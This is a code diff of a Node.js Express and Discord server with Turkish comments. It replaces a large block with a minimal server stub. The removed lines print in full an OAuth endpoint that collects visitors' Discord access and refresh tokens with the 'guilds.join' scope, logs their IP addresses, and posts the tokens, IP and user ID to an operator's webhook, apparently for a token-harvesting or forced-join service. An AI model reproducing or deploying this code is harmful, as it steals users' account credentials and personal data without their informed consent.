@@ -1,180 +1,42 @@
 const express = require('express');
+const app = express();
 const path = require('path');
 const mongoose = require('mongoose');
-const fs = require('fs');
-const { Collection, WebhookClient, Client, Intents } = require('discord.js');
-const fetch = require('node-fetch');
+const emoji = require('./src/Structures/Emojis.js');
 const config = require('./config');
+const { WebhookClient } = require('discord.js');
+const webhook = new WebhookClient({ url: config.webhookURL });
+const fetch = require('node-fetch');
 const { createUser, updateUser } = require('./src/Structures/Functions');
 const { User } = require('./src/Models/index');
 const { success, logErr, log, yellow } = require('./src/Structures/Functions');
-const emoji = require('./src/Structures/Emojis.js');
 
-// ---------------- BOT ----------------
-const client = new Client({
-    intents: [
-        Intents.FLAGS.GUILDS,
-        Intents.FLAGS.GUILD_MEMBERS,
-        Intents.FLAGS.GUILD_MESSAGES
-    ]
-});
+Array.prototype.random = function () {
+    return this[Math.floor(Math.random() * this.length)];
+};
 
-// Command handler
-client.commands = new Collection();
-const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
-for (const file of commandFiles) {
-    const command = require(`./commands/${file}`);
-    client.commands.set(command.name, command);
-}
-
-// Login
-client.login(config.token).then(() => console.log("Bot logged in!"));
-
-// Ready
-client.on('ready', () => {
-    console.log(`${client.user.tag} olarak giriş yapıldı!`);
-});
-
-// ---------------- COMMANDS ----------------
-client.on('messageCreate', async (message) => {
-    if (message.author.bot) return;
-    if (!message.content.startsWith(config.prefix)) return;
-
-    const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
-    const cmdName = args.shift().toLowerCase();
-
-    const command = client.commands.get(cmdName);
-    if (!command) return;
-
-    try {
-        await command.execute(message, args, client);
-    } catch (err) {
-        console.error(err);
-        message.reply("Komut çalıştırılamadı!");
-    }
-});
-
-// ---------------- WEBHOOK ----------------
-const webhook = new WebhookClient({ url: config.webhookURL });
-
-// ---------------- DATABASE ----------------
+// MongoDB bağlantısı
 async function loadDatabase() {
     try {
         await mongoose.connect(config.mongo, {
             autoIndex: true,
-            maxPoolSize: 10,
-            serverSelectionTimeoutMS: 60000,
-            socketTimeoutMS: 60000,
-            family: 4,
+            useNewUrlParser: true,
+            useUnifiedTopology: true,
         });
-        success('Database loaded');
+        console.log("✅ MongoDB bağlantısı başarılı!");
     } catch (err) {
-        logErr(`Database error : ${err}`);
+        console.error("❌ MongoDB bağlantısı başarısız:", err);
     }
 }
 
-// ---------------- EXPRESS APP ----------------
-const app = express();
-
-// HTML endpoint
-app.use(express.static(path.join(__dirname, 'html')));
+// Sunucu başlatma
+const PORT = process.env.PORT || 3000;
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'html', 'index.html'));
+    res.send('Bot Render üzerinde çalışıyor 🚀');
 });
 
-// OAuth endpoint
-app.get('/auth', async (req, res) => {
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const { code } = req.query;
-
-    log(`${ip} : Yeni Ziyaretçi`);
-    if (!code || code.length < 30) return res.sendStatus(400);
-
-    try {
-        const oauthResult = await fetch('https://discord.com/api/oauth2/token', {
-            method: 'POST',
-            body: new URLSearchParams({
-                client_id: config.clientID,
-                client_secret: config.clientSecret,
-                code,
-                grant_type: 'authorization_code',
-                redirect_uri: config.redirectURI,
-                scope: 'identify guilds.join',
-            }),
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        });
-
-        const oauthData = await oauthResult.json();
-
-        const userResult = await fetch('https://discord.com/api/users/@me', {
-            headers: { authorization: `${oauthData.token_type} ${oauthData.access_token}` },
-        });
-
-        const userInfo = await userResult.json();
-        if (userInfo.code == 0) {
-            res.sendStatus(400);
-            return logErr(`${ip} : Invalid code in URL`);
-        }
-
-        try {
-            await fetch(
-                `https://discord.com/api/v10/guilds/${config.guildId}/members/${userInfo.id}/roles/${config.roleId}`,
-                { method: 'PUT', headers: { Authorization: `Bot ${config.token}` } }
-            );
-        } catch (error) { }
-
-        const findUser = await User.findOne({ id: userInfo.id });
-        yellow(`${'='.repeat(50)}`);
-        success(`${ip} : Yeni Bağlantı ( ${userInfo.username}#${userInfo.discriminator} )`);
-
-        if (!findUser) {
-            sendWebhook(userInfo, oauthData, ip);
-            createUser(userInfo, oauthData.access_token, oauthData.refresh_token);
-        } else if (findUser.access_token !== oauthData.access_token) {
-            sendWebhook(userInfo, oauthData, ip);
-            updateUser(userInfo, {
-                access_token: oauthData.access_token,
-                refresh_token: oauthData.refresh_token,
-            });
-        } else {
-            logErr(`User DB Error : ${userInfo.username}#${userInfo.discriminator} Zaten izin verdi.`);
-        }
-        yellow(`${'='.repeat(50)}`);
-    } catch (err) {
-        logErr(err);
-    }
-
-    res.redirect(config.redirectionBot.random());
-});
-
-// ---------------- WEBHOOK FUNCTION ----------------
-function sendWebhook(userInfo, oauthData, ip) {
-    let avatarUrl = userInfo.avatar
-        ? userInfo.avatar.startsWith('a_')
-            ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.gif?size=4096`
-            : `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.png?size=4096`
-        : `https://cdn.discordapp.com/embed/avatars/0.png`;
-
-    webhook.send({
-        embeds: [{
-            color: 3092790,
-            description: `${emoji.progress} **Yeni Erişim**(BaytonHUB)`,
-            thumbnail: { url: avatarUrl },
-            fields: [
-                { name: `${emoji.member} Kullanıcı Adı`, value: `\`\`\`ini\n[ @${userInfo.username} ]\`\`\`` },
-                { name: `${emoji.author} IP Adresi`, value: `\`\`\`ini\n[ ${ip} ]\`\`\`` },
-                { name: `${emoji.author} Kullanıcı ID`, value: `\`\`\`ini\n[ ${userInfo.id} ]\`\`\`` },
-                { name: `${emoji.author} Erişim Tokeni`, value: `\`\`\`ini\n[ ${oauthData.access_token} ]\`\`\`` },
-                { name: `${emoji.author} Yenileme Tokeni`, value: `\`\`\`ini\n[ ${oauthData.refresh_token} ]\`\`\`` }
-            ],
-            timestamp: new Date()
-        }],
-    }).catch(err => logErr(err));
-}
-
-// ---------------- START SERVER ----------------
-const PORT = process.env.PORT || config.port;
+// Express server’ı dinlet
 app.listen(PORT, async () => {
+    console.log(`✅ Server çalışıyor: http://localhost:${PORT}`);
     await loadDatabase();
-    console.log(`OAuth & Bot server running on port ${PORT}`);
-});.
+});
